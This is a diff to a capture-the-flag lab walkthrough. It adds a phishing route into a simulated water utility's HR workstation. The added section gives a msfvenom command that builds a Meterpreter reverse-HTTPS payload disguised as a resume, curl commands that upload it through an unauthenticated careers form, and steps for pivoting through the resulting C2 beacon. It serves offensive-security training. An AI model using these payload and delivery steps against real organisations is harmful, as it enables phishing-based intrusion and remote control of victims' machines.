@@ -33,7 +33,59 @@ Read [CASE_STUDY.md](CASE_STUDY.md) and answer the scoreboard's Intel questions:
 
 ---
 
-## Phase 1 — Initial access on the DMZ web server (`ww-web01`, 10.X.10.10)
+## Phase 1 — Initial access
+
+There are **two independent ways in**. Do either (or both). Phase 1A is the web
+exploit chain on the DMZ; Phase 1B is phishing the HR workstation. Phase 1B lands
+you directly inside Corporate IT (VLAN 20), skipping the web→IT pivot.
+
+---
+
+## Phase 1B (alternative) — Phishing the HR workstation → `foothold_phish` (150)
+
+**Target:** `ww-ws01` (Windows HR workstation, 10.X.20.30), via the public
+Careers page on `ww-web01`.
+
+WaterWorks is hiring, and the Careers page accepts resume uploads. An HR user
+(`a.wallace`) is auto-logged-on to `ww-ws01` and runs an "HR Resume Intake" task
+that downloads every uploaded file and **opens it (double-click)**. So a
+double-clickable payload becomes code execution on the workstation.
+
+1. **Build a payload** with your own C2 (LHOST = your WireGuard IP, e.g. `198.51.100.x`).
+   Any double-clickable format works — `.exe`, `.scr`, `.vbs`, `.bat`, `.cmd`,
+   `.hta`, `.lnk`:
+   ```bash
+   # example: a staged Meterpreter exe (use whatever C2 you like)
+   msfvenom -p windows/x64/meterpreter/reverse_https LHOST=198.51.100.X LPORT=443 -f exe -o resume_amanda_wallace.exe
+   # start your listener (msfconsole multi/handler, Sliver, Havoc, nc for a plain shell, …)
+   ```
+2. **Upload it** to the Careers page (unauthenticated), from your VPN host:
+   ```bash
+   curl -s -F 'name=Amanda W' -F 'email=a@x.com' \
+        -F 'resume=@resume_amanda_wallace.exe' \
+        http://waterworkspipeline.com/careers/apply
+   # confirm it landed in the HR intake queue:
+   curl -s http://waterworkspipeline.com/careers/inbox.json
+   ```
+3. **Wait ~20–40 s.** The HR intake task pulls your file to `a.wallace`'s Downloads,
+   strips Mark-of-the-Web, and double-clicks it → your implant fires and beacons
+   back over WireGuard.
+4. **On your beacon** (running as `a.wallace` on `WW-WS01`), grab the flag and
+   start pivoting:
+   ```cmd
+   type C:\Users\a.wallace\Desktop\flag.txt      REM foothold_phish
+   ```
+   You're now in VLAN 20. `ww-fs01` and `ww-it01` are on the **same subnet** (no
+   firewall between them), so you can hit the file server's SMB shares and the IT
+   server directly from here, then continue with Phase 2 onward. Route your tools
+   through this beacon (SOCKS via your C2) to reach the rest of the range.
+
+> Tip: `curl -s http://waterworkspipeline.com/careers/inbox.json` lets you confirm
+> your upload is queued; the file disappears from "new" once HR has opened it.
+
+---
+
+## Phase 1A — Initial access on the DMZ web server (`ww-web01`, 10.X.10.10)
 
 ### 1a. Recon → `web_recon` (50)
 
@@ -402,10 +454,11 @@ freezes until `run` (or the auto-repair timer).
 
 ---
 
-## Flag checklist (21 — 4,050 pts)
+## Flag checklist (22 — 4,200 pts)
 
 | # | Flag | Pts | Where |
 |---|------|-----|-------|
+| 0 | foothold_phish | 150 | ww-ws01 `a.wallace` Desktop (phished resume beacon) |
 | 1 | web_recon | 50 | ww-web01 `/staging/` comment |
 | 2 | web_lfi | 100 | ww-web01 `.env` via traversal |
 | 3 | web_rce | 150 | ww-web01 SSTI → `/home/wwp-web/flag.txt` |
